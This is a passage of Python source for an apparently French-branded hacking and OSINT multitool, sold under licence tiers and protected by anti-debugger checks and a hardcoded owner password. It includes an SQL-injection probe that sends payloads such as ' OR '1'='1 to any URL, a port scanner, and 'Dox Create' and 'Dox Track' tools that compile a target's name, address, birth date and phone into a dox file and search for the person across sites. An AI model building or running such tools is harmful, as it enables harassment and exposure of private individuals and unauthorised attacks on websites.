    for i, it in enumerate(items, 1): print(f"  {PALE}[{i}]{RST} {W}{it}{RST}")
    if ask("Remove N° (empty=cancel):", "") != "":
        try:
            idx = int(ask("N°:")) - 1
            if 0 <= idx < len(items): items.pop(idx); _fav_save(items)
        except Exception: pass
    pause()

# ========================================================================
# ANTI-DEBUG / TAMPER
# ========================================================================
_INTEGRITY_FILE = os.path.join(_SETT_DIR, ".integrity")
def _is_debugged():
    if not _get("anti_debug", False) or _IS_FROZEN or os.name != "nt": return False
    try:
        import ctypes
        if ctypes.windll.kernel32.IsDebuggerPresent(): return True
    except Exception: pass
    return False
def _anti_debug_check():
    if _is_debugged():
        clr(); print(f"\n  {R}[DEBUGGER DETECTED]{RST} Close x64dbg/IDA.\n"); sys.exit(1)
def _verify_integrity():
    if not _IS_FROZEN or not _get("tamper_check", False): return True
    if not os.path.isfile(_INTEGRITY_FILE): return True
    try:
        exp = open(_INTEGRITY_FILE).read().strip()
        act = hashlib.sha256(open(sys.executable, "rb").read()).hexdigest()
        if exp and act != exp:
            print(f"\n  {R}[TAMPER]{RST} Binary modified.\n"); time.sleep(2); sys.exit(1)
    except Exception: pass
    return True
def _seal_build():
    if not _IS_FROZEN: print(f"{INF} Only on frozen builds."); pause(); return
    try:
        os.makedirs(_SETT_DIR, exist_ok=True)
        open(_INTEGRITY_FILE, "w").write(hashlib.sha256(open(sys.executable, "rb").read()).hexdigest())
        _SETTINGS["tamper_check"] = True; _save_settings()
        print(f"{OK} Sealed.")
    except Exception as e: print(f"{ERR} {e}")
    pause()

# ========================================================================
# PLUGINS
# ========================================================================
_PLUGIN_DIR = "plugins"; _PLUGIN_REG = {}
def _load_plugins():
    if not os.path.isdir(_PLUGIN_DIR): os.makedirs(_PLUGIN_DIR, exist_ok=True); return []
    loaded = []
    for f in sorted(os.listdir(_PLUGIN_DIR)):
        if not f.endswith(".py") or f.startswith("_"): continue
        try:
            spec = importlib.util.spec_from_file_location("c6r6_p_" + f[:-3], os.path.join(_PLUGIN_DIR, f))
            mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
            if hasattr(mod, "register"): mod.register(_PLUGIN_REG); loaded.append(f[:-3])
        except Exception as e: print(f"  {Y}[!]{RST} plugin {f}: {e}")
    return loaded
def plugins_menu():
    while True:
        if not _PLUGIN_REG: print(f"  {DIM}No plugins in ./plugins{RST}"); pause(); return
        items = [("0", T("back"))] + [(str(i+1), n) for i, n in enumerate(sorted(_PLUGIN_REG))]
        menu_box("PLUGINS", items)
        c = input(f"  {R}>{RST} ").strip()
        if c == "0": break
        try: _PLUGIN_REG[sorted(_PLUGIN_REG)[int(c) - 1]]()
        except Exception as e: print(f"{ERR} {e}"); pause()

# ========================================================================
# CYTHON COMPILE
# ========================================================================
_CY_SETUP = '''import os
from setuptools import setup
from Cython.Build import cythonize
NAME = "__NAME__"
EXT = cythonize(
    [NAME + ".pyx"],
    compiler_directives={
        "language_level": "3",
        "boundscheck": False,
        "wraparound": False,
        "cdivision": True,
        "initializedcheck": False,
        "nonecheck": False,
        "embedsignature": False,
    },
    nthreads=os.cpu_count() or 4,
    force=True,
)
setup(name=NAME, ext_modules=EXT, script_args=["build_ext", "--inplace"])
'''
_CY_LOADER = '''import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import __NAME__ as _m
if __name__ == "__main__":
    try: _m.main()
    except KeyboardInterrupt: sys.exit(0)
'''
def _cy_deps():
    for p in ("cython","setuptools","wheel","pyinstaller"):
        subprocess.run([sys.executable, "-m", "pip", "install", p, "--quiet",
                        "--disable-pip-version-check"], check=False)

def _cy_build(sd, name, work):
    src = os.path.join(sd, name + ".py")
    pyx = os.path.join(work, name + ".pyx")
    try: shutil.copy2(src, pyx)
    except Exception as e:
        print(f"{ERR} copy .py → .pyx: {e}"); return None
    if not os.path.isfile(pyx) or os.path.getsize(pyx) == 0:
        print(f"{ERR} .pyx missing or empty after copy."); return None
    with open(os.path.join(work, "setup.py"), "w", encoding="utf-8") as f:
        f.write(_CY_SETUP.replace("__NAME__", name))
    r = subprocess.run([sys.executable, "setup.py", "build_ext", "--inplace"],
                       cwd=work, capture_output=True, text=True, timeout=1200)
    if r.returncode != 0:
        print(f"{ERR} Cython build failed (rc={r.returncode}).")
        print(f"{DIM}--- last 1500 chars ---\n{(r.stderr or r.stdout or '')[-1500:]}{RST}")
        return None
    ext = ".pyd" if os.name == "nt" else ".so"
    found = None
    for f in os.listdir(work):
        if f.startswith(name) and f.endswith(ext):
            p = os.path.join(work, f)
            if os.path.getsize(p) > 0 and (found is None or os.path.getsize(p) > os.path.getsize(found)):
                found = p
    if not found:
        print(f"{ERR} .pyd not produced. Files in work dir:")
        for f in os.listdir(work)[:20]: print(f"   {f}")
        return None
    return found

def _cy_bundle(sd, name, work, pyd):
    loader = os.path.join(work, "main.py")
    with open(loader, "w", encoding="utf-8") as f:
        f.write(_CY_LOADER.replace("__NAME__", name))
    out_dir = os.path.join(sd, "dist"); os.makedirs(out_dir, exist_ok=True)
    cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--console", "--name", name,
           "--add-binary", f"{pyd}{os.pathsep}.",
           "--hidden-import=requests","--hidden-import=colorama",
           "--hidden-import=PIL","--hidden-import=PIL.ExifTags","--hidden-import=PIL.ImageGrab",
           "--hidden-import=qrcode","--hidden-import=websocket","--hidden-import=pynput",
           "--hidden-import=pynput.keyboard","--hidden-import=whois",
           "--collect-all=colorama","--collect-all=qrcode",
           "--distpath", out_dir,
           "--workpath", os.path.join(work, "piw"),
           "--specpath", os.path.join(work, "pis"),
           "--clean", "--noconfirm", loader]
    r = subprocess.run(cmd, cwd=work, capture_output=True, text=True, timeout=1200)
    exe = os.path.join(out_dir, name + (".exe" if os.name == "nt" else ""))
    if not os.path.isfile(exe):
        print(f"{ERR} Bundle failed (rc={r.returncode}).")
        print(f"{DIM}--- last 1000 chars ---\n{(r.stderr or r.stdout or '')[-1000:]}{RST}")
        return None
    return exe

def _compile_to_exe(silent=False):
    if _IS_FROZEN:
        print(f"{INF} Already compiled.")
        if not silent: pause()
        return
    script = os.path.abspath(__file__); sd = os.path.dirname(script)
    name = os.path.splitext(os.path.basename(script))[0]
    if not silent:
        banner_s("CYTHON COMPILER")
        print(f"  {DIM}Python → C → .pyd natif + bundle exe.{RST}")
        print(f"  {DIM}Sortie : ./dist/{name}.exe{RST}\n")
        print(f"  {Y}[1]{RST} Compiler maintenant")
        print(f"  {Y}[2]{RST} Annuler\n")
        if ask("Choix:", "1") == "2":
            print(f"  {DIM}{T('cancel')}.{RST}"); pause(); return
    work = os.path.join(sd, "_cython_build")
    if os.path.isdir(work):
        for _ in range(3):
            try: shutil.rmtree(work); break
            except Exception: time.sleep(0.5)
        if os.path.isdir(work): shutil.rmtree(work, ignore_errors=True)
    os.makedirs(work, exist_ok=True)
    print(f"{INF} Installation deps (cython / setuptools / wheel / pyinstaller)...")
    _cy_deps()
    print(f"{INF} Cython compilation (1-3 min)...\n")
    pyd = _cy_build(sd, name, work)
    if not pyd:
        print(f"\n{ERR} Cython échoué. Rien dans dist/.")
        if not silent: pause()
        return
    print(f"{G}[+]{RST} Module : {Y}{pyd}{RST}  {DIM}({os.path.getsize(pyd)/1024:.0f} KB){RST}")
    print(f"\n{INF} Bundle PyInstaller...\n")
    exe = _cy_bundle(sd, name, work, pyd)
    if not exe:
        print(f"\n{ERR} Bundle échoué. Le .pyd est là, l'exe ne l'est pas.")
        if not silent: pause()
        return
    size_mb = os.path.getsize(exe) / (1024 * 1024)
    print(f"\n{G}[+]{RST} → {Y}{exe}{RST}  {DIM}({size_mb:.1f} MB){RST}")
    _hist_log("BUILD","Cython",os.path.basename(exe))
    if not silent:
        if ask(f"  Lancer? {T('yes_no')}:", "n").lower() in ("y","o","yes","oui"):
            try: subprocess.Popen([exe], cwd=sd); sys.exit(0)
            except Exception as e: print(f"{ERR} {e}")
        pause()

def _ask_exe(path):
    if ask("Compile to .exe? (y/n):", "n").lower() not in ("y","o"): return
    _cy_deps()
    subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
                    "--distpath", "1-Output", "--workpath", "1-Output/build",
                    "--specpath", "1-Output/build", path], capture_output=True, text=True)
    _hist_log("BUILD","Exe",os.path.basename(path))
def _first_run_compile_prompt():
    if _IS_FROZEN or _get("first_run_done", False): return
    _SETTINGS["first_run_done"] = True; _save_settings()
    clr(); leakfr_banner()
    print(f"  {BRIGHT}First run. Compile to standalone .exe?{RST}\n")
    if ask(f"  {T('yes_no')}:", "n").lower() in ("y","o","yes","oui"):
        _compile_to_exe(silent=True)
    else:
        print(f"  {DIM}{T('cancel')}.{RST}"); time.sleep(0.8)

# ========================================================================
# LICENSE
# ========================================================================
_OWNER_PW = "moumou-leakfr"; _OWNER_TRIG = "1337"; _LIC_GRACE = 7 * 86400
_LIC_FILE = os.path.join(_SETT_DIR, ".c6r6_license")
_OWNER_TRIES = {"n": 0}

def _hwid():
    if _is_win():
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
            g, _ = winreg.QueryValueEx(k, "MachineGuid"); winreg.CloseKey(k)
            if g: return hashlib.sha256(g.encode()).hexdigest()[:32]
        except Exception: pass
    import uuid
    n = uuid.getnode()
    if (n >> 40) & 1 or n == 0:
        src = f"{platform.node()}|{platform.processor()}|{platform.machine()}"
    else:
        src = str(n)
    return hashlib.sha256(src.encode()).hexdigest()[:32]
def _save_lic(d):
    os.makedirs(_SETT_DIR, exist_ok=True); d["cached_at"] = int(time.time())
    open(_LIC_FILE, "w", encoding="utf-8").write(json.dumps(d))
def _load_lic():
    if not os.path.isfile(_LIC_FILE): return None
    try: return json.load(open(_LIC_FILE, encoding="utf-8"))
    except Exception: return None
def _srv_validate(key, hwid):
    try:
        r = _SESSION.post(_srv_url() + "/validate", json={"key": key, "hwid": hwid}, timeout=12)
        if r.status_code == 511: return {"ok": False, "msg": "tunnel:511"}
        if "json" not in r.headers.get("Content-Type", ""):
            if r.status_code in (401,403): return {"ok": False, "msg": "tunnel:auth"}
            return {"ok": False, "msg": f"http{r.status_code}-nonjson"}
        return r.json()
    except requests.exceptions.Timeout:
        return {"ok": False, "msg": "offline: timeout"}
    except requests.exceptions.SSLError as e:
        return {"ok": False, "msg": f"offline: ssl {str(e)[:40]}"}
    except Exception as e:
        return {"ok": False, "msg": f"offline: {str(e)[:60]}"}
def _srv_admin(path, payload=None, method="POST"):
    url = _srv_url() + path
    try:
        h = {"X-Admin": _OWNER_PW, "Content-Type": "application/json"}
        if method == "POST":
            r = _SESSION.post(url, headers=h, json=payload or {}, timeout=12)
        else:
            r = _SESSION.get(url, headers=h, timeout=12)
        if r.status_code == 511: return {"ok": False, "msg": "tunnel:511"}
        if "json" not in r.headers.get("Content-Type", ""):
            return {"ok": False, "msg": f"non-json http{r.status_code}"}
        return r.json()
    except Exception as e:
        return {"ok": False, "msg": f"unreachable: {str(e)[:60]}"}
def _is_activated():
    global _TIER, _BRAND
    lic = _load_lic()
    if not lic: return False, "no license"
    hwid = _hwid()
    if lic.get("hwid") != hwid: return False, "wrong machine"
    r = _srv_validate(lic["key"], hwid)
    if r.get("ok"):
        lic.update({"exp": r["exp"], "tier": r.get("tier", "free"), "sig": r["sig"]})
        _save_lic(lic); _TIER = lic["tier"]; _BRAND = _load_brand()
        if lic["exp"] != 0 and lic["exp"] < int(time.time()): return False, "expired"
        return True, "ok"
    if "offline" in r.get("msg", "") or "tunnel" in r.get("msg", ""):
        age = int(time.time()) - lic.get("cached_at", 0)
        if age > _LIC_GRACE: return False, "cache expired"
        _TIER = lic.get("tier", "free"); _BRAND = _load_brand()
        if lic.get("exp", 0) and lic["exp"] < int(time.time()): return False, "expired (cache)"
        return True, f"grace {_LIC_GRACE - age}s"
    return False, r.get("msg", "refused")
def _activate(key):
    hwid = _hwid(); r = _srv_validate(key, hwid)
    if not r.get("ok"): return False, r.get("msg", "refused")
    _save_lic({"key": key, "exp": r["exp"], "tier": r.get("tier", "free"),
               "sig": r["sig"], "hwid": hwid})
    return True, "activated"
def _fmt_exp(exp): return "LIFETIME" if exp == 0 else datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
def _dur_to_exp(dur):
    dur = dur.strip().lower()
    if dur in ("life","lifetime","0"): return 0
    mult = {"d":86400,"w":604800,"m":2592000,"y":31536000}
    try:
        n = int(dur[:-1]); u = dur[-1]
        return int(time.time()) + n * mult[u] if u in mult else None
    except Exception: return None
def _ver_tuple(v):
    parts = [int(x) for x in re.findall(r"\d+", str(v))]
    while len(parts) < 4: parts.append(0)
    return tuple(parts[:4])

def _check_update():
    if not _get("auto_update", True): return
    try:
        r = _SESSION.get(_srv_url() + "/version", timeout=8)
        if r.status_code != 200: return
        if "json" not in r.headers.get("Content-Type", ""): return
        data = r.json()
    except Exception: return
    sv = data.get("version", "")
    if not sv: return
    if _ver_tuple(sv) <= _ver_tuple(VERSION): return
    print(f"\n  {Y}[!]{RST} Update: {G}{sv}{RST} (current {VERSION})")
    if ask("Apply next launch? (y/n):", "y").lower() not in ("y","o"): return
    url = data.get("url", "")
    if not url: return
    ext_local = os.path.splitext(sys.executable if _IS_FROZEN else __file__)[1].lower()
    ext_remote = os.path.splitext(url)[1].lower()
    if ext_remote and ext_local != ext_remote and not _IS_FROZEN:
        print(f"  {Y}[!]{RST} Binary update refused for .py. Build exe first."); return
    try:
        resp = requests.get(url, headers=_SRV_HEADERS, timeout=60, stream=True)
        if resp.status_code != 200: return
        script = os.path.abspath(sys.executable if _IS_FROZEN else __file__)
        new_p = script + ".new"; part = new_p + ".part"
        with open(part, "wb") as f:
            for chunk in resp.iter_content(8192):
                if chunk: f.write(chunk)
        sha = hashlib.sha256(open(part, "rb").read()).hexdigest()
        if data.get("sha256") and sha != data["sha256"]:
            os.remove(part); print(f"  {R}[x]{RST} Hash mismatch"); return
        if os.path.isfile(new_p): os.remove(new_p)
        os.rename(part, new_p)
        print(f"  {G}[+]{RST} Downloaded ({os.path.getsize(new_p):,} bytes)")
    except Exception as e: print(f"  {R}[x]{RST} {e}")
def _apply_pending_update():
    try:
        script = os.path.abspath(sys.executable if _IS_FROZEN else __file__)
        new_p = script + ".new"; old_p = script + ".old"
        if not os.path.isfile(new_p): return
        if os.path.isfile(old_p): os.remove(old_p)
        os.rename(script, old_p); os.rename(new_p, script)
        print(f"  {G}[+]{RST} Update applied. Relaunch."); time.sleep(1.5); sys.exit(0)
    except Exception: pass

def activation_screen():
    clr(); leakfr_banner()
    bar = "═" * 60
    print(f"  {MID}{bar}{RST}")
    print(f"  {MID}║{RST} {BRT}{BRIGHT}{_pad(T('lic_title'), 60)}{RST} {MID}║{RST}")
    print(f"  {MID}{bar}{RST}\n")
    if _get("auto_activate") and _get("preset_key") and not os.path.isfile(_LIC_FILE):
        print(f"  {DIM}Auto-activation...{RST}"); _page_loader("Verify")
        key = _get("preset_key")
    else:
        print(f"  {Y}[!]{RST} {T('lic_none')}")
        print(f"  {DIM}HWID   : {G}{_hwid()}{RST}")
        print(f"  {DIM}Server : {_srv_url()}{RST}")
        print(f"  {DIM}Tiers  : free · vip · vip+ · ami · owner{RST}")
        print(f"  {DIM}Discord: {DISCORD_LINK}{RST}\n")
        key = input(f"  {BRIGHT}{T('lic_key')} >{RST} ").strip()
    if key == _OWNER_TRIG: owner_menu(); return activation_screen()
    ok, msg = _activate(key)
    if ok:
        _page_loader("Verify"); print(f"  {G}[OK]{RST} {T('lic_ok')}")
        _hist_log("LICENSE","Activate",key[:20]); time.sleep(1.0); return
    print(f"  {R}[X]{RST} {msg}")
    if "tunnel" in msg or "offline" in msg:
        print(f"  {DIM}Settings > 20 for full server diagnostic.{RST}")
    time.sleep(2.0); sys.exit(1)

# ========================================================================
# BRAND
# ========================================================================
_AMI_DIR = os.path.join(_SETT_DIR, ".ami")
_BRAND_FILE = os.path.join(_AMI_DIR, ".brand")
def _load_brand():
    try: return open(_BRAND_FILE).read().strip()
    except Exception: return ""

# ========================================================================
# NETWORK
# ========================================================================
def net_menu():
    while True:
        menu_box("NETWORK", [
            ("1","IP Lookup"),("2","Port Scanner"),("3","Pinger"),
            ("4","Website Scanner"),("5","SQL Vuln"),("6","DNS Lookup"),
            ("7","Subdomain"),("8","Headers"),("9","Traceroute"),
            ("10","Reverse IP"),("11","URL Scan"),("12","MAC Vendor"),
            ("13","VirusTotal Link"),("14","SSL Cert"),("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": net_ip, "2": net_port, "3": net_ping, "4": net_web, "5": net_sql,
               "6": net_dns, "7": net_sub, "8": net_headers, "9": net_trace,
               "10": net_revip, "11": net_url, "12": net_mac, "13": net_vt, "14": net_ssl}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def net_ip():
    banner_s("IP LOOKUP"); ip = ask("IP:")
    if not ip: pause(); return
    d = jget(f"http://ip-api.com/json/{ip}?fields=66846719"); pkv(d)
    if d.get("proxy") or d.get("hosting"):
        print(f"  {R}[PROXY/VPN]{RST} proxy={d.get('proxy')} hosting={d.get('hosting')}")
    _hist_log("NET","IP",ip); clip_pause(ip)
def net_port():
    banner_s("PORT SCAN"); host = ask("Host:"); rng = ask("Range (1-1024):", "1-1024")
    try:
        p1, p2 = map(int, rng.split("-")) if "-" in rng else (int(rng), int(rng))
    except Exception: print(f"{ERR} {T('invalid')}"); pause(); return
    print(f"\n{INF} Scanning {host}\n "); op = []
    for port in range(p1, p2+1):
        s = socket.socket(); s.settimeout(0.3)
        if s.connect_ex((host, port)) == 0:
            try: svc = socket.getservbyport(port)
            except Exception: svc = "?"
            print(f"  {G}[OPEN]{RST} {port} {DIM}{svc}{RST}"); op.append(port)
        s.close()
    print(f"\n{OK} {len(op)} ports."); _hist_log("NET","Port",f"{host}:{len(op)}"); pause()
def net_ping():
    banner_s("PING"); h = ask("Host:"); p = "-n" if _is_win() else "-c"
    print(subprocess.run(["ping", p, "4", h], capture_output=True, text=True).stdout)
    _hist_log("NET","Ping",h); pause()
def net_web():
    banner_s("WEB SCAN"); url = ask("URL:")
    try:
        r = requests.get(url, timeout=10)
        for k, v in [("Status", r.status_code), ("Server", r.headers.get("Server","?")),
                     ("Powered", r.headers.get("X-Powered-By","?")), ("Length", len(r.content))]:
            print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
        _hist_log("NET","Web",url)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def net_sql():
    banner_s("SQL SCAN"); url = ask("URL:"); hits = []
    for pl in ["'", "' OR '1'='1", "' OR 1=1--", "1 UNION SELECT NULL--"]:
        try:
            r = requests.get(url + pl, timeout=5)
            hit = any(e in r.text.lower() for e in ["sql syntax","mysql_fetch","syntax error"])
            if hit: hits.append(pl)
            print(f"  {G if hit else DIM}[{'VULN' if hit else 'SAFE'}]{RST} {pl}")
        except Exception: pass
    _hist_log("NET","SQL",f"{url}:{len(hits)}"); pause()
def net_dns():
    banner_s("DNS"); d = ask("Domain:")
    for rt in ("A","MX","NS","TXT"):
        cmd = ["nslookup", f"-type={rt}", d] if _is_win() else ["dig","+short",rt,d]
        try:
            o = subprocess.run(cmd, capture_output=True, text=True, timeout=5).stdout.strip()
            if o: print(f"\n  {Y}{rt}{RST}:\n  {W}{o}{RST}")
        except Exception: pass
    _hist_log("NET","DNS",d); pause()
def net_sub():
    banner_s("SUBDOMAIN"); d = ask("Domain:"); found = []
    for s in ["www","mail","api","dev","test","admin","cdn","static","blog","shop","staging"]:
        try:
            ip = socket.gethostbyname(f"{s}.{d}")
            print(f"  {G}[FOUND]{RST} {s}.{d} → {ip}"); found.append(f"{s}.{d} → {ip}")
        except Exception: pass
    if found: out(f"subdomains_{d}.txt", "\n".join(found))
    _hist_log("NET","Sub",f"{d}:{len(found)}"); pause()
def net_headers():
    banner_s("HEADERS"); url = ask("URL:")
    try:
        r = requests.get(url, timeout=8); txt = ""
        for k, v in r.headers.items(): print(f"  {Y}{k:<28}{RST} {W}{v}{RST}"); txt += f"{k}: {v}\n"
        _hist_log("NET","Headers",url); clip_pause(txt.strip())
    except Exception as e: print(f"{ERR} {e}"); pause()
def net_trace():
    banner_s("TRACEROUTE"); h = ask("Host:")
    cmd = ["tracert", h] if _is_win() else ["traceroute", h]
    try: print(subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout)
    except Exception as e: print(f"{ERR} {e}")
    _hist_log("NET","Trace",h); pause()
def net_revip():
    banner_s("REVERSE IP"); ip = ask("IP:")
    try: print(f"  {Y}Host{RST}: {W}{socket.gethostbyaddr(ip)[0]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pkv(jget(f"http://ip-api.com/json/{ip}")); _hist_log("NET","RevIP",ip); pause()
def net_url():
    banner_s("URL SCAN"); url = ask("URL:")
    try:
        r = requests.get(url, timeout=10)
        for l in re.findall(r'href=["\']([^"\']+)["\']', r.text)[:20]:
            print(f"  {G}→{RST} {DIM}{l[:80]}{RST}")
        _hist_log("NET","URL",url)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def net_mac():
    banner_s("MAC VENDOR"); mac = ask("MAC:").upper().replace("-", ":")
    oui = mac.replace(":", "")[:6]
    if len(oui) < 6: print(f"{ERR} {T('invalid')}"); pause(); return
    try:
        r = requests.get(f"https://api.macvendors.com/{oui}", timeout=8)
        print(f"  {Y}Vendor{RST} : {G}{r.text.strip()}{RST}" if r.status_code == 200 else f"{INF} Not found")
        _hist_log("NET","MAC",oui)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def net_vt():
    banner_s("VIRUSTOTAL"); t = ask("Hash / URL / IP:")
    if re.match(r"^[a-fA-F0-9]{32,64}$", t): u = f"https://www.virustotal.com/gui/file/{t}"
    elif t.startswith("http"): u = f"https://www.virustotal.com/gui/url/{base64.urlsafe_b64encode(t.encode()).decode().rstrip('=')}"
    elif re.match(r"^\d+\.\d+\.\d+\.\d+$", t): u = f"https://www.virustotal.com/gui/ip-address/{t}"
    else: u = f"https://www.virustotal.com/gui/domain/{t}"
    print(f"  {Y}Link{RST}: {G}{u}{RST}")
    try:
        import webbrowser
        if ask("Open? (y/n):", "y").lower() in ("y","o"): webbrowser.open(u)
    except Exception: pass
    _hist_log("NET","VT",t[:40]); pause()
def net_ssl():
    banner_s("SSL CERT"); host = ask("Domain:").replace("https://","").replace("http://","").strip("/")
    port = ask_int("Port:", 443); import ssl as _ssl
    try:
        ctx = _ssl.create_default_context()
        with socket.create_connection((host, port), timeout=10) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                c = ss.getpeercert()
                print(f"  {Y}TLS{RST}       : {G}{ss.version()}{RST}")
                if c:
                    sub = dict(x[0] for x in c.get("subject", []))
                    iss = dict(x[0] for x in c.get("issuer", []))
                    print(f"  {Y}CN{RST}        : {W}{sub.get('commonName','?')}{RST}")
                    print(f"  {Y}Issuer{RST}    : {W}{iss.get('organizationName','?')}{RST}")
                    print(f"  {Y}Not after{RST} : {W}{c.get('notAfter','?')}{RST}")
                    exp = datetime.strptime(c["notAfter"], "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                    days = (exp - datetime.now(timezone.utc)).days
                    col = G if days > 30 else Y if days > 7 else R
                    print(f"  {Y}Expires{RST}   : {col}{days} days{RST}")
        _hist_log("NET","SSL",host)
    except Exception as e: print(f"{ERR} {e}")
    pause()

# ========================================================================
# OSINT
# ========================================================================
def osint_menu():
    while True:
        menu_box("OSINT", [
            ("1","Username"),("2","Email"),("3","Phone"),("4","Dorking"),
            ("5","Image EXIF"),("6","Dox Create"),("7","Dox Track"),
            ("8","Instagram"),("9","TikTok"),("10","Snapchat"),("11","Twitter/X"),
            ("12","Face Recon"),("13","Steam ID"),("14","Shodan"),
            ("15","WHOIS"),("16","IP Geo+"),("17","GitHub"),("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": o_user, "2": o_email, "3": o_phone, "4": o_dork, "5": o_exif,
               "6": o_dox, "7": o_doxtr, "8": o_insta, "9": o_tiktok, "10": o_snap,
               "11": o_tw, "12": o_face, "13": o_steam, "14": o_shodan,
               "15": o_whois, "16": o_ipgeo, "17": o_github}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def o_user():
    banner_s("USERNAME TRACKER"); u = ask("Username:")
    if not u: pause(); return
    sites = {"GitHub": f"https://github.com/{u}", "Twitter": f"https://x.com/{u}",
             "Instagram": f"https://instagram.com/{u}", "TikTok": f"https://tiktok.com/@{u}",
             "Reddit": f"https://reddit.com/user/{u}", "YouTube": f"https://youtube.com/@{u}",
             "Twitch": f"https://twitch.tv/{u}", "Steam": f"https://steamcommunity.com/id/{u}",
             "Roblox": f"https://roblox.com/user.aspx?username={u}", "Telegram": f"https://t.me/{u}",
             "Pinterest": f"https://pinterest.com/{u}", "SoundCloud": f"https://soundcloud.com/{u}",
             "Medium": f"https://medium.com/@{u}", "Snapchat": f"https://snapchat.com/add/{u}",
             "Keybase": f"https://keybase.io/{u}"}
    nf = ["not found","404","doesn't exist","no user","page not found"]
    hdrs = {"User-Agent": "Mozilla/5.0"}
    import concurrent.futures
    def ck(n, url):
        try:
            r = requests.get(url, timeout=6, headers=hdrs, allow_redirects=True)
            return (r.status_code == 200 and not any(x in r.text.lower()[:2048] for x in nf), n, url)
        except Exception: return (False, n, url)
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        for ok_, n, url in ex.map(lambda x: ck(*x), sites.items()):
            if ok_: print(f"  {G}[FOUND]{RST} {n:<14} {Y}{url}{RST}"); found.append(f"{n}: {url}")
    if found: out(f"username_{u}.txt", "\n".join(found))
    _hist_log("OSINT","User",f"{u}:{len(found)}"); pause()
def o_email():
    banner_s("EMAIL OSINT"); e = ask("Email:").lower(); gh = hashlib.md5(e.encode()).hexdigest()
    for n, u in [("Gravatar", f"https://gravatar.com/avatar/{gh}"),
                 ("HIBP", f"https://haveibeenpwned.com/account/{e}"),
                 ("Dehashed", f"https://dehashed.com/search?query={e}"),
                 ("IntelX", f"https://intelx.io/?s={e}"),
                 ("Hunter", f"https://hunter.io/email-verifier/{e}")]:
        print(f"  {G}[{n}]{RST} {DIM}{u}{RST}")
    _hist_log("OSINT","Email",e); clip_pause(e)
def o_phone():
    banner_s("PHONE OSINT"); n = re.sub(r'[\s\-.()]','',ask("Number (+cc):"))
    if not n.startswith("+"): n = "+" + n
    for name, u in [("Google", f"https://google.com/search?q=%22{n}%22"),
                    ("Truecaller", f"https://truecaller.com/search/en/{n[1:]}"),
                    ("Telegram", f"https://t.me/{n[1:]}"), ("WhatsApp", f"https://wa.me/{n[1:]}"),
                    ("Sync.ME", f"https://sync.me/?q={n[1:]}")]:
        print(f"  {G}[{name}]{RST} {DIM}{u}{RST}")
    _hist_log("OSINT","Phone",n); clip_pause(n)
def o_dork():
    banner_s("DORKING"); t = ask("Target:")
    for d in [f'site:{t}', f'site:{t} filetype:pdf', f'site:{t} intitle:"index of"',
              f'site:{t} inurl:admin', f'site:{t} filetype:env', f'site:{t} inurl:backup',
              f'site:{t} intext:"password"', f'site:{t} ext:sql', f'site:{t} inurl:login']:
        print(f"  {G}→{RST} {DIM}{d}{RST}")
    _hist_log("OSINT","Dork",t); pause()
def o_exif():
    banner_s("IMAGE EXIF")
    try: from PIL import Image, ExifTags
    except Exception: _pip("Pillow"); from PIL import Image, ExifTags
    p = ask("Image path:")
    try:
        img = Image.open(p); exif = img.getexif(); txt = ""
        if not exif: print(f"{INF} No EXIF.")
        else:
            for tid, val in exif.items():
                l = f"{str(ExifTags.TAGS.get(tid, tid)):<28} {val}"; print(f"  {Y}{l}{RST}"); txt += l + "\n"
        _hist_log("OSINT","EXIF",p); clip_pause(txt.strip())
    except Exception as e: print(f"{ERR} {e}"); pause()
def o_dox():
    banner_s("DOX CREATE")
    fields = [("full_name","Name"),("alias","Alias"),("dob","DOB"),("phone","Phone"),
              ("email","Email"),("address","Address"),("city","City"),("country","Country"),
              ("discord","Discord"),("instagram","Insta"),("twitter","Twitter"),("notes","Notes")]
    d = {}
    for k, l in fields:
        v = ask(f"{l:<10}:")
        if v: d[k] = v
    if not d: print(f"{ERR} Empty."); pause(); return
    target = d.get("full_name", d.get("alias", "target"))
    lines = [f"{'='*50}", f"  D0X — {target.upper()}", f"{'='*50}", ""] + \
            [f"  {k.upper():<12}: {v}" for k, v in d.items()]
    print("\n" + "\n".join(lines)); out(f"dox_{_slug(target)}.txt", "\n".join(lines))
    _hist_log("OSINT","Dox",target); pause()
def o_doxtr():
    banner_s("DOX TRACK"); t = ask("Target:")
    for u in [f"https://google.com/search?q={t}", f"https://google.com/search?q={t}+discord",
              f"https://google.com/search?q={t}+instagram",
              f"https://google.com/search?q=site:pastebin.com+{t}",
              f"https://twitter.com/search?q={t}", f"https://tiktok.com/search?q={t}"]:
        print(f"  {G}→{RST} {DIM}{u}{RST}")
    _hist_log("OSINT","DoxTr",t); pause()
def _scrape_social(title, url_tpl, patterns, label):
    banner_s(title); u = ask("Username:").lstrip("@")
    if not u: pause(); return
    try:
        r = requests.get(url_tpl.format(u=u), headers={"User-Agent":"Mozilla/5.0"}, timeout=10)
        for k, pat in patterns.items():
            m = re.search(pat, r.text)
            if m: print(f"  {Y}{k:<10}{RST} {W}{m.group(1)[:80]}{RST}")
        _hist_log("OSINT", label, u)
    except Exception as e: print(f"{ERR} {e}")
    pause()
def o_insta():
    _scrape_social("INSTAGRAM", "https://instagram.com/{u}/?__a=1&__d=dis", {
        "followers": r'"edge_followed_by":\{"count":(\d+)', "name": r'"full_name":"([^"]*)"',
        "bio": r'"biography":"([^"]*)"', "private": r'"is_private":(true|false)'}, "Insta")
def o_tiktok():
